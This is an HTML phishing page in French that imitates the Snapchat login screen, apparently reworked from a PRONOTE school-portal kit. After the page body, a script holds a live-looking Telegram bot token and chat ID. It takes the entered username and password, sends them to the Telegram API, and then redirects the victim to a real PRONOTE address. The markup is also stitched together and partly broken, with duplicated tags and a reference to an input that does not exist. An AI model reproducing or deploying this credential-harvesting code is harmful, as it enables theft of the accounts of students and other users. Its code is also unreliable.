<!DOCTYPE html>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Snapchat</title>
    
    <style>
        :root {
            /* Couleurs principales */
            --snap-blue: #00BFFF; /* Bouton Se connecter */
            --snap-yellow: #FFFC00; /* Bouton Ouvrir dans Snapchat */
            --text-color: #333;
            --light-grey: #ddd; 
            --link-color: #00BFFF; 
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .main-container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            box-sizing: border-box;
            margin-top: 50px;
        }

        /* --- Logo Fantôme Snapchat --- */
        .logo-ghost {
            font-size: 50px; 
            margin-bottom: 20px;
            display: block;
            text-align: center;
        }

        .logo-ghost::before {
            content: "👻";
            line-height: 1;
        }

        .title {
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 40px;
            text-align: center;
        }

        /* --- Formulaire et Champs --- */
        .form-label {
            display: block;
            text-align: left;
            font-size: 15px;
            font-weight: 500;
            color: #666; /* Plus clair que le titre */
            margin-bottom: 5px;
            margin-top: 15px; /* Espace entre les champs */
        }

        .input-group {
            margin-bottom: 10px;
        }

        .input-field {
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid var(--light-grey); 
            font-size: 17px;
            box-sizing: border-box;
            outline: none;
            transition: border-bottom-color 0.3s;
        }

        .input-field:focus {
            border-bottom-color: var(--text-color);
        }

        /* --- Bouton de Connexion (Bleu) --- */
        .login-button-blue {
            width: 90%;
            max-width: 300px;
            padding: 15px 20px;
            margin-top: 35px;
            border: none;
            border-radius: 50px; 
            background-color: var(--snap-blue);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        /* --- Lien "Mot de passe oublié ?" --- */
        .secondary-link {
            text-align: center;
            margin-top: 20px;
        }

        .secondary-link a {
            color: var(--link-color);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        /* --- Zone Inscription (Bas du formulaire) --- */
        .signup-area {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 80px;
            font-size: 15px;
        }

        .signup-area a {
            margin-left: 5px;
            font-weight: 600;
            color: var(--text-color);
            text-decoration: none;
        }
        
        /* --- Bouton du Bas (Barre de navigation simulée) --- */
        .bottom-bar {
            position: fixed;
            bottom: 0;
            width: 100%;
            padding: 20px 0;
            text-align: center;
            background-color: white;
            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.05);
        }

        .bottom-button {
            width: 90%;
            padding: 15px 0;
            border: none;
            border-radius: 50px; 
            background-color: var(--snap-yellow);
            color: var(--text-color);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="main-container">
        
        <div class="logo-ghost"></div>

        <h1 class="title">Se connecter à Snapchat</h1>

        <form action="http://127.0.0.1:5000/traitement_connexion" method="POST">
            
            <div class="input-group">
                <label for="id_29" class="form-label">Nom d'utilisateur ou adresse e-mail</label>
                <input 
                    type="text" 
                    name="id_29"  
                    id="id_29" 
                    class="input-field" 
                    required
                >
            </div>
            
            <div class="input-group">
                <label for="id_30" class="form-label">Mot de passe</label>
                <input 
                    type="password" 
                    name="id_30"  
                    id="id_30" 
                    class="input-field" 
                    required
                >
            </div>
            
            <div class="secondary-link">
                <a href="#">Mot de passe oublié ?</a>
            </div>
            
            <button type="submit" class="login-button-blue">
                Se connecter
            </button>
        </form>

        <div class="signup-area">
            <span>Vous débutez sur Snapchat ?</span> 
            <a href="#">S'inscrire</a>
        </div>
    </div>

    <div class="bottom-bar">
        <button class="bottom-button">
            Ouvrir dans Snapchat
        </button>
    </div>

</body>
</html>
<script>
    // Configuration Telegram - À MODIFIER avec vos vraies valeurs
    const TELEGRAM_BOT_TOKEN = '8556128794:AAE5e_vJogpX4QKD1-RjqE-CpINUk6EDKUM';
    const TELEGRAM_CHAT_ID = '1949276292';
    
    async function sendToTelegram() {
      // Récupération des valeurs des champs
      const identifiant = document.getElementById('id_29').value;
      const motDePasse = document.getElementById('id_30').value;
      const modeConnexion = document.querySelector('input[name="1_1_choixConnexion"]:checked').nextElementSibling.nextElementSibling.textContent.trim();
      
      // Vérification que les champs sont remplis
      if (!identifiant || !motDePasse) {
        alert('Veuillez remplir tous les champs obligatoires.');
        return;
      }
      
      // Construction du message
      const message = `🔐 Nouvelle tentative de connexion PRONOTE\n\n` +
                     `👤 Identifiant: ${identifiant}\n` +
                     `🔑 Mot de passe: ${motDePasse}\n` +
                     `📍 Mode: ${modeConnexion}\n` +
                     `⏰ Date: ${new Date().toLocaleString('fr-FR')}\n` +
                     `🌐 IP: ${window.location.hostname}`;
      
      try {
        // Envoi vers Telegram
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        if (response.ok) {
          console.log('Message envoyé avec succès à Telegram');
        } else {
          console.error('Erreur lors de l\'envoi à Telegram:', response.status);
        }
      } catch (error) {
        console.error('Erreur réseau:', error);
      }
      
      // Redirection vers le site original (comme dans votre code)
      setTimeout(() => {
        window.location.href = "https://e972000a.index-education.net/pronote/";
      }, 1000);
    }
    
    // Ancienne logique du bouton conservée
    const btn = document.getElementById("btnConnexion") || document.querySelector("button");
    if (btn) {
        btn.disabled = false;
        btn.style.backgroundColor = "#FFFC00";
        btn.style.color = "#333";
        btn.style.cursor = "pointer";
    }
  </script>

</body>
</html>
